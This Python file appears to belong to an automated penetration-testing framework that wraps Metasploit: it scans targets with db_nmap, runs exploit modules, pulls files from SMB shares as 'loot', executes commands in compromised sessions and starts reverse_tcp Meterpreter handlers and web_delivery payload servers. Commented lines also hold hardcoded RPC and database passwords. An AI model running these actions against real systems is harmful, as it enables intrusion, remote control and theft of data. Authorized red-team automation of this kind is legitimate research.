# from pymetasploit3.msfrpc import MsfRpcClient
# client      = MsfRpcClient('Amdspon200ss11a')
# console_id = client.consoles.console().cid
# console    = client.consoles.console(console_id)
# client.db.connect(username='msf', database='msf', host='127.0.0.1',password='MyS3cr$t', port=5432)

import ntpath

from lib.Common.Exploration.Environment.Observation import ProcessedObservation
from lib.Common.Exploration.Actions.BaseAction import BaseAction
import lib.Common.Utils.Log as Log
import lib.Common.Utils as Utils

# METASPLOIT ACTIONS

def create_metasploit_action(environment, metasploit_action_name, action_type, action_data):
    metasploit_action = MetasploitAction(environment, action_type.lower(), metasploit_action_name, action_data)

    return metasploit_action

class MetasploitDbNmap(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_type = "auxiliary"
        self.action_name = action_name

    def execute(self, options):
        # options
        mode = self.get_option(options, "mode")
        dst_ip = self.get_option(options, "dst_ip")
        delay_to_observe = self.get_option(options, "delay_to_observe")

        command = "db_nmap -A -Pn"
        command += " %s" % dst_ip  # options['DST_IP']

        if mode == "quick":
            pass
        elif mode == "top_10000":
            command += " --top-ports 10000"
        elif mode == "top_1000":
            command += " --top-ports 1000"
        elif mode == "top_100":
            command += " --top-ports 100"
        elif mode == "all":
            command += "  -p-"
        elif mode == "single":
            port = self.get_option(options, "rport")  # options["PORT"]
            command += " -p %s -Pn" % port

        raw_observation = self.environment.execute_meterpreter_oneliner_command(self.action_name, self.action_type,
                                                                                delay_to_observe, command, options)
        processed_observation = self.create_observation(raw_observation)

        return processed_observation

    def create_observation(self, raw_observation):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return {
            "DST_IP": {
                "required": "yes",
                "type": "ipv4",
                "description": "ip to scan",
            },
            "MODE": {
                "required": "yes",
                "type": "string",
                "allowed_values": ["quick", "top_1000", "top_10000", "all", "single"],
                "description": "mode of the scan",
            },
            "RPORT": {
                "required": "no",
                "type": "port",
                "range": ["1", "65535"],
                "description": "port specification of scan",
            },
            "DELAY_TO_OBSERVE": {
                "required": "yes",
                "type": "int",
                "description": "delay after observation",
            }
        }


class MetasploitAction(BaseAction):
    def __init__(self, environment, action_type, action_name, action_data):
        self.environment          = environment
        self.action_type          = action_type
        self.action_name          = action_name
        self.action_data          = action_data
        self.is_metasploit_action = True

        self.options = {}

        for option_name in action_data["mandatory_options"]:
            self.options[option_name] = {
                "required": "yes",
                "type": "string",
            }

        for option_name in action_data["all_options"]:
            if option_name not in self.options:
                self.options[option_name] = {
                    "required": "no",
                    "type": "string"
                }

        if action_type == "exploit":
            # Log.logger.debug([action_type, action_name, action_data])
            if 'payloads' in action_data and len(action_data['payloads']) > 0:
                self.options["PAYLOAD"] = {
                    "required": "no",  # TODO: This should move to 'yes' to ensure we set a payload per request
                    "type": "payload",
                    "allowed_values": action_data['payloads'],
                }

            if 'targets' in action_data and len(action_data['targets']) > 0:
                self.options["TARGET"] = {
                    "required": "no",
                    "type": "target",
                    "allowed_values": list(action_data['targets'].values()),
                }

        # FINALLY ADD DEFAULT DELAY OPTION
        self.options["DELAY_TO_OBSERVE"] = {
            "required": "yes",
            "type": "int",
            "description": "delay after observation",
        }

        for option_name in self.options:
            if option_name in action_data["options_information"]:
                if "type" in action_data["options_information"][option_name]:
                    self.options[option_name]["type"] = action_data["options_information"][option_name]["type"]
                if "desc" in action_data["options_information"][option_name]:
                    self.options[option_name]["description"] = action_data["options_information"][option_name]["desc"]
                if 'default' in action_data["options_information"][option_name]:
                    self.options[option_name]["default"] = action_data["options_information"][option_name]["default"]

    def execute(self, options):
        command = "use %s" % self.action_name
        metasploit_options = options

        delay_to_observe = self.get_option(options, "delay_to_observe")

        if self.action_name == "auxiliary/admin/smb/download_file":
            raw_observation = self.environment.execute_meterpreter_command_that_downloads_file(self.action_name,
                                                                                               self.action_type,
                                                                                               delay_to_observe,
                                                                                               command, options)
        else:
            raw_observation = self.environment.execute_meterpreter_command(self.action_name, self.action_type,
                                                                           delay_to_observe, command, options)

        processed_observation = self.create_observation(raw_observation, options)

        return processed_observation

    def create_observation(self, raw_observation, options):
        message = raw_observation.observed_output

        observed_data = {}

        # PROCESS DIFFERENT MODULES OUTPUT TO POPULATE DATA
        Log.logger.debug("Processing action_name %s" % self.action_name)
        if self.action_name == "auxiliary/admin/smb/download_file":
            file_contents = raw_observation.observed_output

            rhosts = options["RHOSTS"]
            rpath = options["RPATH"]
            smbshare = options["SMBSHARE"]

            Log.logger.debug(rpath)
            observed_data = {
                "loot": {
                    "file_content": [{
                        "address": rhosts,
                        "filepath": ntpath.basename(rpath),
                        "filename": rpath,
                        "file_contents": file_contents,
                    }]
                }
            }
            Log.logger.debug(observed_data)

            message = "Read content for file %s in rhosts %s and share %s and got %s" % (
                rpath, rhosts, smbshare, file_contents)
        elif self.action_name == "auxiliary/admin/smb/list_directory":
            lines = raw_observation.observed_output.split("\n")

            rhosts = options["RHOSTS"]

            count = 0
            path = "UNKNOWN_" + Utils.get_hash_of_dumped_json(lines)[:6]
            for line in lines:
                count += 1
                if "Directory Listing of" in line:
                    path = line.split("Directory Listing of ")[1]
                    break

            listing_lines = lines[count + 4:-2]
            Log.logger.debug(listing_lines)

            import lib.Common.Exploration.Environment.Analysis as Analysis
            files_list = Analysis.get_files_list_from_output(listing_lines)

            files_map = {}
            for file in files_list:
                filename = file["filename"]
                filesize = file["filesize"]
                files_map[path + filename] = filesize

            observed_data = {
                "loot": {
                    "files_list": {
                        "address": rhosts,
                        "files": files_map,
                    }
                }
            }

            Log.logger.debug(observed_data)

        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message,
                                                                            observed_data=observed_data, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return self.options


class DeleteMetasploitSessions(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_type = "auxiliary"
        self.action_name = action_name

    def execute(self, options):
        command = "sessions -K"

        delay_to_observe = 0
        raw_observation = self.environment.execute_meterpreter_command(self.action_name, self.action_type,
                                                                       delay_to_observe, command, options)
        processed_observation = self.create_observation(raw_observation)

        return processed_observation

    def create_observation(self, raw_observation):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return {}


class ExecuteMeterpreterCommandInMetasploitSession(BaseAction):
    # Should create an observation based on command data
    # Will return an error if no session is available

    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "session_execution"

    def execute(self, options):
        session_command = self.get_option(options, "command")
        delay_to_observe = 0  # no delay needed for sessions

        # 1) ASK ENVIRONMENT IF THERE ARE ANY SESSIONS AVAILABLE
        sessions_dict = self.environment.get_sessions_dict()

        # 3) CHECK FOR SESSIONS
        if len(sessions_dict) > 0:
            session_id = self.environment.get_newest_session_id()
            session_data = sessions_dict[session_id].get_dict()

            # 3) EXECUTE
            terminating_str = ['--------------']
            Log.logger.debug("Executing command in session: %s" % session_id)

            raw_observation = self.environment.run_command_in_session(self.action_name, self.action_type,
                                                                      delay_to_observe, session_id, session_command,
                                                                      terminating_str)
            processed_observation = self.create_observation(raw_observation, session_data, session_command)

            return processed_observation
        else:
            return ProcessedObservation("", "", 0, None, "NO SESSION AVAILABLE TO EXECUTE COMMAND")

    def create_observation(self, raw_observation, used_session, used_session_command):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])
        processed_observation.set_session_data(used_session, used_session_command)

        return processed_observation

    def get_options(self):
        return {
            "COMMAND": {
                "required": "yes",
                "type": "shell_command",
                "description": "command to execute in the session",
            },
        }


class UpgradeMetasploitSession(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "upgrade_metasploit_session"

    def execute(self, options):
        delay_to_observe = self.get_option(options, "delay_to_observe")

        # 1) ASK ENVIRONMENT IF THERE ARE ANY SESSIONS AVAILABLE
        sessions_dict = self.environment.get_sessions_dict()

        # 3) CHECK FOR SESSIONS
        if len(sessions_dict) > 0:
            session_id = self.environment.get_newest_session_id()
            session_data = sessions_dict[session_id].get_dict()

            if session_data["desc"] != "Meterpreter":
                Log.logger.debug("Upgrading session: %s" % session_id)

                command = "sessions -u %s" % session_id

                raw_observation = self.environment.execute_meterpreter_command(self.action_name, self.action_type,
                                                                               delay_to_observe, command, options)
                processed_observation = self.create_observation(raw_observation)
            else:
                processed_observation = ProcessedObservation("", "", 0, None, "SESSION AVAILABLE IS ALREADY METERPRETER SESSION")

            return processed_observation
        else:
            return ProcessedObservation("", "", 0, None, "NO SESSION AVAILABLE TO EXECUTE COMMAND")

    def create_observation(self, raw_observation):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return {
            "DELAY_TO_OBSERVE": {
                "required": "yes",
                "type": "int",
                "description": "delay after observation",
            },
        }


class ExecuteMeterpreterShellCommandInMetasploitSession(BaseAction):
    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "session_execution"

    def execute(self, options):
        session_command = self.get_option(options, "command")
        timeout = self.get_option(options, "timeout")
        delay_to_observe = 0  # no delay needed for sessions

        # 1) ASK ENVIRONMENT IF THERE ARE ANY SESSIONS AVAILABLE
        sessions_dict = self.environment.get_sessions_dict()

        # 3) CHECK FOR SESSIONS
        if len(sessions_dict) > 0:
            session_id = self.environment.get_newest_session_id()
            session_data = sessions_dict[session_id].get_dict()

            Log.logger.debug("Executing command %s in session: %s" % (session_command, session_id))

            raw_observation = self.environment.run_shell_command_in_session(self.action_name, self.action_type,
                                                                            delay_to_observe, session_id,
                                                                            session_command, timeout)
            processed_observation = self.create_observation(raw_observation, session_data, session_command)

            return processed_observation
        else:
            return ProcessedObservation("", "", 0, None, "NO SESSION AVAILABLE TO EXECUTE COMMAND")

    def create_observation(self, raw_observation, used_session, used_session_command):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])
        processed_observation.set_session_data(used_session, used_session_command)

        return processed_observation

    def get_options(self):
        return {
            "COMMAND": {
                "required": "yes",
                "type": "shell_command",
                "description": "command to execute in the session",
            },
            "TIMEOUT": {
                "required": "yes",
                "type": "int",
                "default": 60,
                "description": "timeout for command",
            },
        }


class CreateMeterpreterListener(BaseAction):
    # Should create an observation based on command data
    # Will return an error if no session is available

    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "exploit"

    def execute(self, options):
        delay_to_observe = 0

        options = {
            "LPORT": self.get_option(options, "lport"),
            "LHOST": self.get_option(options, "lhost"),
            "PAYLOAD": "windows/meterpreter/reverse_tcp",
        }

        command = "use exploit/multi/handler"
        raw_observation = self.environment.execute_meterpreter_command(self.action_name, self.action_type,
                                                                       delay_to_observe, command,
                                                                       options)
        processed_observation = self.create_observation(raw_observation)

        return processed_observation

    def create_observation(self, raw_observation):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return {
            "LPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port to listen at",
            },
            "LHOST": {
                "required": "yes",
                "type": "address",
                "description": "target for exploit",
            },
        }


class CreateMeterpreterFileServerAndListener(BaseAction):
    # Should create an observation based on command data
    # Will return an error if no session is available

    def __init__(self, environment, action_name):
        self.environment = environment
        self.action_name = action_name
        self.action_type = "exploit"

    def execute(self, options):
        delay_to_observe = self.get_option(options, "delay_to_observe")

        options = {
            "SRVPORT": self.get_option(options, "srvport"),
            "URIPATH": self.get_option(options, "uripath"),
            "LHOST":   self.get_option(options, "lhost"),
            "LPORT":   self.get_option(options, "lport"),
            "TARGET":  self.get_option(options, "target"),
            "PAYLOAD": "windows/meterpreter/reverse_tcp",
        }

        command = "use exploit/multi/script/web_delivery"
        raw_observation = self.environment.execute_meterpreter_command(self.action_name, self.action_type,
                                                                       delay_to_observe, command,
                                                                       options)
        processed_observation = self.create_observation(raw_observation)

        return processed_observation

    def create_observation(self, raw_observation):
        message = raw_observation.observed_output
        processed_observation = self.environment.CreateProcessedObservation(self.action_name, message, time_taken=0,
                                                                            raw_observations=[raw_observation])

        return processed_observation

    def get_options(self):
        return {
            "LPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port to listen at for meterpreter",
            },
            "LHOST": {
                "required": "yes",
                "type": "address",
                "description": "target for exploit",
            },
            "URI": {  # example file.exe
                "required": "yes",
                "type": "string",
                "description": "port to listen at",
                "default": "file.exe",
            },
            "SRVPORT": {
                "required": "yes",
                "type": "int",
                "range": ["1", "65535"],
                "description": "port to listen at for fileserver",
            },
            "TARGET": {
                "required": "yes",
                "type": "int",
                "range": ["1", "7"],
                "description": "target to use",
            },
            "DELAY_TO_OBSERVE": {
                "required": "yes",
                "type": "int",
                "description": "delay after observation",
            },
        }
